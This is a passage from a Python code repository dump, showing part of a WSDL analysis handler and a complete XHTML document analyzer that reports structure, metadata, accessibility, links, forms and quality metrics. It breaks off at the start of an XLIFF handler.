    def _extract_bindings_v2(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract bindings from WSDL 2.0"""
        bindings = []
        
        for binding in root.findall('.//{http://www.w3.org/ns/wsdl}binding'):
            bindings.append({
                'name': binding.get('name'),
                'interface': binding.get('interface'),
                'type': binding.get('type'),
                'protocol': self._extract_protocol_v2(binding)
            })
        
        return bindings
    
    def _extract_protocol_v2(self, binding: ET.Element) -> str:
        """Determine protocol from WSDL 2.0 binding"""
        binding_type = binding.get('type', '')
        
        if 'soap' in binding_type.lower():
            return 'SOAP'
        elif 'http' in binding_type.lower():
            return 'HTTP'
        else:
            return 'unknown'
    
    def _determine_mep(self, operation: ET.Element) -> str:
        """Determine Message Exchange Pattern"""
        has_input = operation.find('.//{http://schemas.xmlsoap.org/wsdl/}input') is not None
        has_output = operation.find('.//{http://schemas.xmlsoap.org/wsdl/}output') is not None
        
        if has_input and has_output:
            return 'request-response'
        elif has_input and not has_output:
            return 'one-way'
        elif not has_input and has_output:
            return 'notification'
        else:
            return 'unknown'
    
    def _get_documentation(self, element: ET.Element) -> Optional[str]:
        """Extract documentation from element"""
        doc = element.find('.//{http://schemas.xmlsoap.org/wsdl/}documentation')
        if doc is not None and doc.text:
            return doc.text.strip()
        return None
    
    def _extract_wsdl1_data(self, root: ET.Element) -> Dict[str, Any]:
        """Extract key data for WSDL 1.1"""
        return {
            'service_endpoints': self._extract_all_endpoints(root),
            'operation_signatures': self._extract_operation_signatures(root),
            'soap_actions': self._extract_soap_actions(root),
            'message_schemas': self._extract_message_schemas(root)
        }
    
    def _extract_wsdl2_data(self, root: ET.Element) -> Dict[str, Any]:
        """Extract key data for WSDL 2.0"""
        return {
            'service_endpoints': self._extract_all_endpoints_v2(root),
            'interface_hierarchy': self._extract_interface_hierarchy(root),
            'operation_patterns': self._extract_operation_patterns_v2(root)
        }
    
    def _extract_all_endpoints(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract all service endpoints"""
        endpoints = []
        
        for service in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}service'):
            service_name = service.get('name')
            
            for port in service.findall('.//{http://schemas.xmlsoap.org/wsdl/}port'):
                # SOAP address
                addr = port.find('.//{http://schemas.xmlsoap.org/wsdl/soap/}address')
                if addr is not None:
                    endpoints.append({
                        'service': service_name,
                        'port': port.get('name'),
                        'url': addr.get('location'),
                        'protocol': 'SOAP'
                    })
        
        return endpoints
    
    def _extract_operation_signatures(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract operation signatures with input/output"""
        signatures = []
        
        for pt in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}portType'):
            for op in pt.findall('.//{http://schemas.xmlsoap.org/wsdl/}operation'):
                sig = {
                    'operation': op.get('name'),
                    'port_type': pt.get('name'),
                    'input': None,
                    'output': None
                }
                
                input_elem = op.find('.//{http://schemas.xmlsoap.org/wsdl/}input')
                if input_elem is not None:
                    sig['input'] = self._resolve_message_type(root, input_elem.get('message'))
                
                output_elem = op.find('.//{http://schemas.xmlsoap.org/wsdl/}output')
                if output_elem is not None:
                    sig['output'] = self._resolve_message_type(root, output_elem.get('message'))
                
                signatures.append(sig)
        
        return signatures[:20]  # Limit to first 20
    
    def _extract_soap_actions(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract SOAP actions for operations"""
        actions = []
        
        for binding in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}binding'):
            for op in binding.findall('.//{http://schemas.xmlsoap.org/wsdl/}operation'):
                soap_op = op.find('.//{http://schemas.xmlsoap.org/wsdl/soap/}operation')
                if soap_op is not None and soap_op.get('soapAction'):
                    actions.append({
                        'operation': op.get('name'),
                        'binding': binding.get('name'),
                        'action': soap_op.get('soapAction')
                    })
        
        return actions
    
    def _extract_message_schemas(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract message schemas"""
        schemas = []
        
        for msg in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}message')[:10]:
            schema = {
                'message': msg.get('name'),
                'parts': []
            }
            
            for part in msg.findall('.//{http://schemas.xmlsoap.org/wsdl/}part'):
                schema['parts'].append({
                    'name': part.get('name'),
                    'type': part.get('type') or part.get('element')
                })
            
            schemas.append(schema)
        
        return schemas
    
    def _resolve_message_type(self, root: ET.Element, message_ref: str) -> Optional[str]:
        """Resolve message reference to type"""
        if not message_ref:
            return None
        
        # Remove namespace prefix if present
        msg_name = message_ref.split(':')[-1]
        
        # Find message
        for msg in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}message'):
            if msg.get('name') == msg_name:
                # Get first part's type
                part = msg.find('.//{http://schemas.xmlsoap.org/wsdl/}part')
                if part is not None:
                    return part.get('type') or part.get('element')
        
        return message_ref
    
    def _extract_all_endpoints_v2(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract endpoints from WSDL 2.0"""
        endpoints = []
        
        for service in root.findall('.//{http://www.w3.org/ns/wsdl}service'):
            for endpoint in service.findall('.//{http://www.w3.org/ns/wsdl}endpoint'):
                endpoints.append({
                    'service': service.get('name'),
                    'endpoint': endpoint.get('name'),
                    'address': endpoint.get('address'),
                    'binding': endpoint.get('binding')
                })
        
        return endpoints
    
    def _extract_interface_hierarchy(self, root: ET.Element) -> Dict[str, List[str]]:
        """Extract interface inheritance in WSDL 2.0"""
        hierarchy = {}
        
        for interface in root.findall('.//{http://www.w3.org/ns/wsdl}interface'):
            name = interface.get('name')
            extends = interface.get('extends')
            
            if extends:
                hierarchy[name] = [e.strip() for e in extends.split()]
            else:
                hierarchy[name] = []
        
        return hierarchy
    
    def _extract_operation_patterns_v2(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract operation patterns from WSDL 2.0"""
        patterns = []
        
        for interface in root.findall('.//{http://www.w3.org/ns/wsdl}interface'):
            for op in interface.findall('.//{http://www.w3.org/ns/wsdl}operation'):
                patterns.append({
                    'interface': interface.get('name'),
                    'operation': op.get('name'),
                    'pattern': op.get('pattern', 'in-out')
                })
        
        return patterns
    
    def _assess_wsdl_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess WSDL quality metrics"""
        # Documentation coverage
        doc_count = 0
        total_items = 0
        
        # Count documented operations
        for pt in findings.get('port_types', []):
            for op in pt.get('operations', []):
                total_items += 1
                if op.get('documentation'):
                    doc_count += 1
        
        doc_coverage = doc_count / max(total_items, 1)
        
        # Service completeness
        services = findings.get('services', [])
        endpoints_defined = sum(len(s.get('ports', [])) for s in services)
        service_completeness = min(endpoints_defined / max(len(services), 1), 1.0)
        
        # Type definition coverage
        types_defined = len(findings.get('types', []))
        type_coverage = min(types_defined / 20, 1.0)  # Assume 20+ types is good
        
        # Binding completeness
        bindings = findings.get('bindings', [])
        binding_completeness = 1.0 if bindings else 0.0
        
        return {
            "documentation": doc_coverage,
            "service_completeness": service_completeness,
            "type_coverage": type_coverage,
            "binding_completeness": binding_completeness,
            "overall_quality": (doc_coverage + service_completeness + type_coverage + binding_completeness) / 4
        }
</file>

<file path="src/handlers/xhtml_handler.py">
#!/usr/bin/env python3
"""
XHTML (Extensible HyperText Markup Language) Handler

Analyzes XHTML documents which are XML-compliant HTML files.
Extracts content structure, semantic elements, accessibility features,
metadata, and web standards compliance information.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os
from urllib.parse import urlparse

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class XHTMLHandler(XMLHandler):
    """Handler for XHTML documents"""
    
    XHTML_NAMESPACE = "http://www.w3.org/1999/xhtml"
    
    def _get_namespace(self, root: ET.Element) -> str:
        """Extract namespace prefix from root element"""
        if '}' in root.tag:
            return root.tag.split('}')[0] + '}'
        return ''
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for XHTML namespace
        if any('w3.org/1999/xhtml' in uri for uri in namespaces.values()):
            return True, 1.0
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag.lower() == 'html':
            # Check for XHTML-specific attributes or elements
            ns = self._get_namespace(root)
            
            # Look for DOCTYPE or XHTML characteristics
            xhtml_indicators = 0
            
            # Check for common XHTML elements
            xhtml_elements = ['head', 'body', 'title', 'meta', 'link']
            for elem in xhtml_elements:
                if root.find(f'.//{ns}{elem}') is not None:
                    xhtml_indicators += 1
            
            # Check for xml:lang attribute (common in XHTML)
            if root.get('{http://www.w3.org/XML/1998/namespace}lang'):
                xhtml_indicators += 2
            
            # Check for xmlns attribute
            if root.get('xmlns'):
                xhtml_indicators += 2
            
            if xhtml_indicators >= 3:
                return True, min(xhtml_indicators * 0.15, 0.9)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect XHTML version
        version = "1.0"  # Default
        
        # Check DOCTYPE or namespace for version hints
        if 'xhtml1/DTD/xhtml1-strict.dtd' in str(root):
            version = "1.0 Strict"
        elif 'xhtml1/DTD/xhtml1-transitional.dtd' in str(root):
            version = "1.0 Transitional"
        elif 'xhtml1/DTD/xhtml1-frameset.dtd' in str(root):
            version = "1.0 Frameset"
        elif 'xhtml11.dtd' in str(root):
            version = "1.1"
        
        # Detect document type based on content
        ns = self._get_namespace(root)
        doc_type = "webpage"
        
        # Check for specific patterns
        if root.find(f'.//{ns}article') is not None:
            doc_type = "article"
        elif root.find(f'.//{ns}form') is not None:
            doc_type = "form_page"
        elif len(root.findall(f'.//{ns}nav')) > 0:
            doc_type = "navigation_page"
        elif root.find(f'.//{ns}main') is not None or root.find(f'.//{ns}section') is not None:
            doc_type = "content_page"
        
        return DocumentTypeInfo(
            type_name="XHTML Document",
            confidence=0.90,
            version=version,
            metadata={
                "standard": "W3C XHTML",
                "category": "web_content",
                "document_type": doc_type,
                "compliance": "xml_compliant"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'document_structure': self._analyze_structure(root),
            'content_analysis': self._analyze_content(root),
            'semantic_elements': self._analyze_semantic_elements(root),
            'metadata': self._analyze_metadata(root),
            'accessibility': self._analyze_accessibility(root),
            'links_and_media': self._analyze_links_and_media(root),
            'forms': self._analyze_forms(root),
            'styling_and_scripts': self._analyze_styling_and_scripts(root),
            'standards_compliance': self._assess_compliance(root)
        }
        
        recommendations = [
            "Validate XHTML markup against W3C standards",
            "Optimize content structure for search engines",
            "Improve accessibility with ARIA attributes",
            "Analyze semantic markup for better SEO",
            "Extract content for content management systems",
            "Audit links and media references",
            "Review form structure and validation",
            "Check cross-browser compatibility"
        ]
        
        ai_use_cases = [
            "Content extraction and text mining",
            "Web scraping and data extraction",
            "SEO analysis and optimization",
            "Accessibility compliance checking",
            "Content structure analysis",
            "Link analysis and validation",
            "Form field extraction",
            "Semantic markup analysis",
            "Multi-language content detection",
            "Template and layout analysis"
        ]
        
        return SpecializedAnalysis(
            document_type="XHTML Document",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_elements': findings['document_structure']['total_elements'],
                'content_sections': findings['content_analysis']['sections'],
                'semantic_elements': findings['semantic_elements']['total_semantic'],
                'links': findings['links_and_media']['total_links'],
                'forms': findings['forms']['form_count'],
                'images': findings['links_and_media']['images']
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'page_metadata': self._extract_page_metadata(root),
            'content_hierarchy': self._extract_content_hierarchy(root),
            'navigation_structure': self._extract_navigation(root),
            'form_data': self._extract_form_data(root),
            'media_inventory': self._extract_media_inventory(root)
        }
    
    def _analyze_structure(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze document structure"""
        ns = self._get_namespace(root)
        structure = {
            'total_elements': 0,
            'max_depth': 0,
            'has_doctype': False,
            'has_head': False,
            'has_body': False,
            'element_counts': {}
        }
        
        # Count all elements and track types
        for elem in root.iter():
            structure['total_elements'] += 1
            tag_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            structure['element_counts'][tag_name] = structure['element_counts'].get(tag_name, 0) + 1
        
        # Calculate max depth
        structure['max_depth'] = self._calculate_max_depth(root)
        
        # Check for essential structure
        structure['has_head'] = root.find(f'{ns}head') is not None
        structure['has_body'] = root.find(f'{ns}body') is not None
        
        return structure
    
    def _analyze_content(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze content elements"""
        ns = self._get_namespace(root)
        content = {
            'headings': {},
            'paragraphs': 0,
            'lists': 0,
            'tables': 0,
            'sections': 0,
            'text_content_length': 0,
            'language': None
        }
        
        # Count headings by level
        for level in range(1, 7):
            count = len(root.findall(f'.//{ns}h{level}'))
            if count > 0:
                content['headings'][f'h{level}'] = count
        
        # Count other content elements
        content['paragraphs'] = len(root.findall(f'.//{ns}p'))
        content['lists'] = (len(root.findall(f'.//{ns}ul')) + 
                           len(root.findall(f'.//{ns}ol')) + 
                           len(root.findall(f'.//{ns}dl')))
        content['tables'] = len(root.findall(f'.//{ns}table'))
        content['sections'] = (len(root.findall(f'.//{ns}section')) + 
                              len(root.findall(f'.//{ns}article')) + 
                              len(root.findall(f'.//{ns}div')))
        
        # Calculate text content
        body = root.find(f'{ns}body')
        if body is not None:
            text_content = self._extract_text_content(body)
            content['text_content_length'] = len(text_content)
        
        # Detect language
        lang = (root.get('lang') or 
                root.get('{http://www.w3.org/XML/1998/namespace}lang') or
                self._detect_content_language(root, ns))
        content['language'] = lang
        
        return content
    
    def _analyze_semantic_elements(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze HTML5 semantic elements"""
        ns = self._get_namespace(root)
        semantic = {
            'total_semantic': 0,
            'elements': {}
        }
        
        # HTML5 semantic elements
        semantic_elements = [
            'header', 'nav', 'main', 'section', 'article', 
            'aside', 'footer', 'figure', 'figcaption', 'details', 
            'summary', 'mark', 'time'
        ]
        
        for elem_name in semantic_elements:
            count = len(root.findall(f'.//{ns}{elem_name}'))
            if count > 0:
                semantic['elements'][elem_name] = count
                semantic['total_semantic'] += count
        
        return semantic
    
    def _analyze_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze document metadata"""
        ns = self._get_namespace(root)
        metadata = {
            'title': None,
            'description': None,
            'keywords': None,
            'author': None,
            'viewport': None,
            'charset': None,
            'meta_tags': [],
            'link_tags': []
        }
        
        # Find head section
        head = root.find(f'{ns}head')
        if head is None:
            return metadata
        
        # Extract title
        title_elem = head.find(f'{ns}title')
        if title_elem is not None and title_elem.text:
            metadata['title'] = title_elem.text.strip()
        
        # Extract meta tags
        for meta in head.findall(f'{ns}meta'):
            meta_info = {
                'name': meta.get('name'),
                'content': meta.get('content'),
                'property': meta.get('property'),
                'http_equiv': meta.get('http-equiv'),
                'charset': meta.get('charset')
            }
            
            # Extract common meta tags
            if meta.get('name') == 'description':
                metadata['description'] = meta.get('content')
            elif meta.get('name') == 'keywords':
                metadata['keywords'] = meta.get('content')
            elif meta.get('name') == 'author':
                metadata['author'] = meta.get('content')
            elif meta.get('name') == 'viewport':
                metadata['viewport'] = meta.get('content')
            elif meta.get('charset'):
                metadata['charset'] = meta.get('charset')
            
            metadata['meta_tags'].append(meta_info)
        
        # Extract link tags
        for link in head.findall(f'{ns}link'):
            link_info = {
                'rel': link.get('rel'),
                'href': link.get('href'),
                'type': link.get('type'),
                'media': link.get('media'),
                'sizes': link.get('sizes')
            }
            metadata['link_tags'].append(link_info)
        
        return metadata
    
    def _analyze_accessibility(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze accessibility features"""
        ns = self._get_namespace(root)
        accessibility = {
            'alt_texts': 0,
            'missing_alt_texts': 0,
            'aria_attributes': 0,
            'form_labels': 0,
            'unlabeled_inputs': 0,
            'heading_structure': [],
            'landmark_roles': 0,
            'tab_indexes': 0
        }
        
        # Check images for alt text
        for img in root.findall(f'.//{ns}img'):
            if img.get('alt') is not None:
                accessibility['alt_texts'] += 1
            else:
                accessibility['missing_alt_texts'] += 1
        
        # Count ARIA attributes
        for elem in root.iter():
            for attr in elem.attrib:
                if attr.startswith('aria-'):
                    accessibility['aria_attributes'] += 1
                elif attr == 'role':
                    accessibility['landmark_roles'] += 1
                elif attr == 'tabindex':
                    accessibility['tab_indexes'] += 1
        
        # Check form labels
        labels = root.findall(f'.//{ns}label')
        accessibility['form_labels'] = len(labels)
        
        # Check unlabeled inputs
        inputs = root.findall(f'.//{ns}input')
        labeled_inputs = set()
        
        for label in labels:
            if label.get('for'):
                labeled_inputs.add(label.get('for'))
        
        unlabeled = 0
        for input_elem in inputs:
            input_id = input_elem.get('id')
            input_type = input_elem.get('type', 'text')
            if input_type not in ['hidden', 'submit', 'button'] and input_id not in labeled_inputs:
                # Check if input is inside a label
                parent = input_elem.getparent() if hasattr(input_elem, 'getparent') else None
                if parent is None or parent.tag.split('}')[-1] != 'label':
                    unlabeled += 1
        
        accessibility['unlabeled_inputs'] = unlabeled
        
        # Analyze heading structure
        heading_levels = []
        for level in range(1, 7):
            headings = root.findall(f'.//{ns}h{level}')
            if headings:
                heading_levels.extend([level] * len(headings))
        
        accessibility['heading_structure'] = heading_levels
        
        return accessibility
    
    def _analyze_links_and_media(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze links and media elements"""
        ns = self._get_namespace(root)
        links_media = {
            'total_links': 0,
            'internal_links': 0,
            'external_links': 0,
            'email_links': 0,
            'broken_link_indicators': 0,
            'images': 0,
            'videos': 0,
            'audio': 0,
            'media_formats': {}
        }
        
        # Analyze links
        for link in root.findall(f'.//{ns}a'):
            href = link.get('href')
            if href:
                links_media['total_links'] += 1
                
                if href.startswith('mailto:'):
                    links_media['email_links'] += 1
                elif href.startswith(('http://', 'https://', '//')):
                    links_media['external_links'] += 1
                elif href.startswith('#') or not href.startswith(('http', 'ftp', 'mailto')):
                    links_media['internal_links'] += 1
                
                # Simple broken link indicators
                if href in ['#', 'javascript:void(0)', 'javascript:;']:
                    links_media['broken_link_indicators'] += 1
        
        # Analyze media
        for img in root.findall(f'.//{ns}img'):
            links_media['images'] += 1
            src = img.get('src')
            if src:
                ext = self._get_file_extension(src)
                if ext:
                    links_media['media_formats'][ext] = links_media['media_formats'].get(ext, 0) + 1
        
        for video in root.findall(f'.//{ns}video'):
            links_media['videos'] += 1
            
        for audio in root.findall(f'.//{ns}audio'):
            links_media['audio'] += 1
        
        return links_media
    
    def _analyze_forms(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze form elements"""
        ns = self._get_namespace(root)
        forms = {
            'form_count': 0,
            'input_types': {},
            'total_inputs': 0,
            'select_elements': 0,
            'textarea_elements': 0,
            'button_elements': 0,
            'form_methods': {},
            'form_actions': []
        }
        
        # Analyze forms
        for form in root.findall(f'.//{ns}form'):
            forms['form_count'] += 1
            
            method = form.get('method', 'get').lower()
            forms['form_methods'][method] = forms['form_methods'].get(method, 0) + 1
            
            action = form.get('action')
            if action:
                forms['form_actions'].append(action)
        
        # Analyze inputs
        for input_elem in root.findall(f'.//{ns}input'):
            forms['total_inputs'] += 1
            input_type = input_elem.get('type', 'text').lower()
            forms['input_types'][input_type] = forms['input_types'].get(input_type, 0) + 1
        
        # Count other form elements
        forms['select_elements'] = len(root.findall(f'.//{ns}select'))
        forms['textarea_elements'] = len(root.findall(f'.//{ns}textarea'))
        forms['button_elements'] = len(root.findall(f'.//{ns}button'))
        
        return forms
    
    def _analyze_styling_and_scripts(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze styling and script elements"""
        ns = self._get_namespace(root)
        styling_scripts = {
            'inline_styles': 0,
            'external_stylesheets': 0,
            'inline_scripts': 0,
            'external_scripts': 0,
            'style_attributes': 0,
            'script_types': {}
        }
        
        # Count style elements
        for style in root.findall(f'.//{ns}style'):
            styling_scripts['inline_styles'] += 1
        
        # Count external stylesheets
        head = root.find(f'{ns}head')
        if head is not None:
            for link in head.findall(f'{ns}link'):
                if link.get('rel') == 'stylesheet':
                    styling_scripts['external_stylesheets'] += 1
        
        # Count script elements
        for script in root.findall(f'.//{ns}script'):
            if script.get('src'):
                styling_scripts['external_scripts'] += 1
            else:
                styling_scripts['inline_scripts'] += 1
                
            script_type = script.get('type', 'text/javascript')
            styling_scripts['script_types'][script_type] = styling_scripts['script_types'].get(script_type, 0) + 1
        
        # Count style attributes
        for elem in root.iter():
            if elem.get('style'):
                styling_scripts['style_attributes'] += 1
        
        return styling_scripts
    
    def _assess_compliance(self, root: ET.Element) -> Dict[str, Any]:
        """Assess standards compliance"""
        compliance = {
            'has_doctype': False,
            'has_xmlns': False,
            'has_lang': False,
            'well_formed': True,  # Assumption since we parsed it
            'semantic_structure': False,
            'accessibility_score': 0.0
        }
        
        # Check for namespace
        compliance['has_xmlns'] = root.get('xmlns') is not None
        
        # Check for language
        compliance['has_lang'] = (root.get('lang') is not None or 
                                 root.get('{http://www.w3.org/XML/1998/namespace}lang') is not None)
        
        # Check for semantic structure
        ns = self._get_namespace(root)
        semantic_elements = ['header', 'nav', 'main', 'section', 'article', 'footer']
        semantic_count = sum(len(root.findall(f'.//{ns}{elem}')) for elem in semantic_elements)
        compliance['semantic_structure'] = semantic_count > 0
        
        return compliance
    
    def _extract_page_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Extract comprehensive page metadata"""
        metadata = self._analyze_metadata(root)
        
        # Add additional metadata
        ns = self._get_namespace(root)
        result = {
            'title': metadata['title'],
            'description': metadata['description'],
            'keywords': metadata['keywords'],
            'author': metadata['author'],
            'language': root.get('lang') or root.get('{http://www.w3.org/XML/1998/namespace}lang'),
            'charset': metadata['charset'],
            'viewport': metadata['viewport']
        }
        
        # Extract Open Graph data
        head = root.find(f'{ns}head')
        if head is not None:
            og_data = {}
            for meta in head.findall(f'{ns}meta'):
                property_attr = meta.get('property')
                if property_attr and property_attr.startswith('og:'):
                    og_data[property_attr] = meta.get('content')
            
            if og_data:
                result['open_graph'] = og_data
        
        return result
    
    def _extract_content_hierarchy(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract content hierarchy based on headings"""
        ns = self._get_namespace(root)
        hierarchy = []
        
        # Find all headings in document order
        body = root.find(f'{ns}body')
        if body is not None:
            for elem in body.iter():
                tag_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                if tag_name in ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']:
                    level = int(tag_name[1])
                    text = elem.text.strip() if elem.text else ''
                    
                    hierarchy.append({
                        'level': level,
                        'text': text,
                        'id': elem.get('id'),
                        'class': elem.get('class')
                    })
        
        return hierarchy[:50]  # Limit for performance
    
    def _extract_navigation(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract navigation structure"""
        ns = self._get_namespace(root)
        navigation = []
        
        # Find navigation elements
        for nav in root.findall(f'.//{ns}nav'):
            nav_info = {
                'id': nav.get('id'),
                'class': nav.get('class'),
                'links': []
            }
            
            # Extract links within navigation
            for link in nav.findall(f'.//{ns}a'):
                link_info = {
                    'text': link.text.strip() if link.text else '',
                    'href': link.get('href'),
                    'title': link.get('title')
                }
                nav_info['links'].append(link_info)
            
            navigation.append(nav_info)
        
        return navigation[:10]  # Limit
    
    def _extract_form_data(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract form structure data"""
        ns = self._get_namespace(root)
        forms_data = []
        
        for form in root.findall(f'.//{ns}form'):
            form_info = {
                'id': form.get('id'),
                'name': form.get('name'),
                'action': form.get('action'),
                'method': form.get('method', 'get'),
                'enctype': form.get('enctype'),
                'fields': []
            }
            
            # Extract form fields
            for input_elem in form.findall(f'.//{ns}input'):
                field_info = {
                    'type': input_elem.get('type', 'text'),
                    'name': input_elem.get('name'),
                    'id': input_elem.get('id'),
                    'required': input_elem.get('required') is not None,
                    'placeholder': input_elem.get('placeholder')
                }
                form_info['fields'].append(field_info)
            
            for select in form.findall(f'.//{ns}select'):
                field_info = {
                    'type': 'select',
                    'name': select.get('name'),
                    'id': select.get('id'),
                    'required': select.get('required') is not None,
                    'multiple': select.get('multiple') is not None,
                    'options': len(select.findall(f'{ns}option'))
                }
                form_info['fields'].append(field_info)
            
            for textarea in form.findall(f'.//{ns}textarea'):
                field_info = {
                    'type': 'textarea',
                    'name': textarea.get('name'),
                    'id': textarea.get('id'),
                    'required': textarea.get('required') is not None,
                    'placeholder': textarea.get('placeholder')
                }
                form_info['fields'].append(field_info)
            
            forms_data.append(form_info)
        
        return forms_data[:10]  # Limit
    
    def _extract_media_inventory(self, root: ET.Element) -> Dict[str, List[Dict[str, Any]]]:
        """Extract media inventory"""
        ns = self._get_namespace(root)
        media = {
            'images': [],
            'videos': [],
            'audio': []
        }
        
        # Extract images
        for img in root.findall(f'.//{ns}img')[:50]:  # Limit
            img_info = {
                'src': img.get('src'),
                'alt': img.get('alt'),
                'title': img.get('title'),
                'width': img.get('width'),
                'height': img.get('height'),
                'class': img.get('class')
            }
            media['images'].append(img_info)
        
        # Extract videos
        for video in root.findall(f'.//{ns}video')[:20]:  # Limit
            video_info = {
                'src': video.get('src'),
                'controls': video.get('controls') is not None,
                'autoplay': video.get('autoplay') is not None,
                'loop': video.get('loop') is not None,
                'width': video.get('width'),
                'height': video.get('height')
            }
            media['videos'].append(video_info)
        
        # Extract audio
        for audio in root.findall(f'.//{ns}audio')[:20]:  # Limit
            audio_info = {
                'src': audio.get('src'),
                'controls': audio.get('controls') is not None,
                'autoplay': audio.get('autoplay') is not None,
                'loop': audio.get('loop') is not None
            }
            media['audio'].append(audio_info)
        
        return media
    
    def _assess_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess XHTML document quality"""
        metrics = {
            'structure_quality': 0.0,
            'content_quality': 0.0,
            'accessibility_quality': 0.0,
            'standards_compliance': 0.0,
            'overall': 0.0
        }
        
        # Structure quality
        structure = findings['document_structure']
        if structure['has_head'] and structure['has_body']:
            metrics['structure_quality'] += 0.4
        
        semantic = findings['semantic_elements']
        if semantic['total_semantic'] > 0:
            metrics['structure_quality'] += 0.3
        
        if structure['max_depth'] < 15:  # Not too deeply nested
            metrics['structure_quality'] += 0.3
        
        # Content quality
        content = findings['content_analysis']
        if content['headings']:
            metrics['content_quality'] += 0.3
        
        if content['paragraphs'] > 0:
            metrics['content_quality'] += 0.2
        
        if content['text_content_length'] > 100:
            metrics['content_quality'] += 0.2
        
        metadata = findings['metadata']
        if metadata['title'] and metadata['description']:
            metrics['content_quality'] += 0.3
        
        # Accessibility quality
        accessibility = findings['accessibility']
        total_images = accessibility['alt_texts'] + accessibility['missing_alt_texts']
        if total_images > 0:
            alt_ratio = accessibility['alt_texts'] / total_images
            metrics['accessibility_quality'] += alt_ratio * 0.3
        else:
            metrics['accessibility_quality'] += 0.3  # No images to worry about
        
        if accessibility['aria_attributes'] > 0:
            metrics['accessibility_quality'] += 0.2
        
        if accessibility['form_labels'] > accessibility['unlabeled_inputs']:
            metrics['accessibility_quality'] += 0.3
        else:
            metrics['accessibility_quality'] += 0.1
        
        if len(accessibility['heading_structure']) > 0:
            metrics['accessibility_quality'] += 0.2
        
        # Standards compliance
        compliance = findings['standards_compliance']
        if compliance['has_xmlns']:
            metrics['standards_compliance'] += 0.25
        if compliance['has_lang']:
            metrics['standards_compliance'] += 0.25
        if compliance['semantic_structure']:
            metrics['standards_compliance'] += 0.25
        if compliance['well_formed']:
            metrics['standards_compliance'] += 0.25
        
        # Overall
        metrics['overall'] = (
            metrics['structure_quality'] * 0.25 +
            metrics['content_quality'] * 0.25 +
            metrics['accessibility_quality'] * 0.3 +
            metrics['standards_compliance'] * 0.2
        )
        
        return metrics
    
    # Utility methods
    def _calculate_max_depth(self, element: ET.Element, current_depth: int = 0) -> int:
        """Calculate maximum nesting depth"""
        if not list(element):
            return current_depth
        
        max_child_depth = current_depth
        for child in element:
            child_depth = self._calculate_max_depth(child, current_depth + 1)
            max_child_depth = max(max_child_depth, child_depth)
        
        return max_child_depth
    
    def _extract_text_content(self, element: ET.Element) -> str:
        """Extract all text content from element and children"""
        texts = []
        if element.text:
            texts.append(element.text.strip())
        
        for child in element:
            texts.append(self._extract_text_content(child))
            if child.tail:
                texts.append(child.tail.strip())
        
        return ' '.join(text for text in texts if text)
    
    def _detect_content_language(self, root: ET.Element, ns: str) -> Optional[str]:
        """Simple content language detection"""
        # This is a very basic implementation
        # In practice, you might use a proper language detection library
        
        body = root.find(f'{ns}body')
        if body is not None:
            text_content = self._extract_text_content(body)
            
            # Simple heuristics based on common words
            if len(text_content) > 100:
                text_lower = text_content.lower()
                
                # English indicators
                english_words = ['the', 'and', 'or', 'but', 'in', 'on', 'at', 'to', 'for', 'of', 'with', 'by']
                english_count = sum(1 for word in english_words if f' {word} ' in text_lower)
                
                # Spanish indicators  
                spanish_words = ['el', 'la', 'de', 'que', 'y', 'en', 'un', 'es', 'se', 'no', 'te', 'lo']
                spanish_count = sum(1 for word in spanish_words if f' {word} ' in text_lower)
                
                # French indicators
                french_words = ['le', 'de', 'et', 'à', 'un', 'il', 'être', 'et', 'en', 'avoir', 'que', 'pour']
                french_count = sum(1 for word in french_words if f' {word} ' in text_lower)
                
                if english_count > spanish_count and english_count > french_count:
                    return 'en'
                elif spanish_count > english_count and spanish_count > french_count:
                    return 'es'
                elif french_count > english_count and french_count > spanish_count:
                    return 'fr'
        
        return None
    
    def _get_file_extension(self, filename: str) -> Optional[str]:
        """Extract file extension from filename"""
        if '.' in filename:
            return filename.split('.')[-1].lower()
        return None
</file>

<file path="src/handlers/xliff_handler.py">
#!/usr/bin/env python3
"""
XLIFF Handler

Analyzes XLIFF (XML Localization Interchange File Format) files used in
translation and localization workflows. Extracts translation units, 
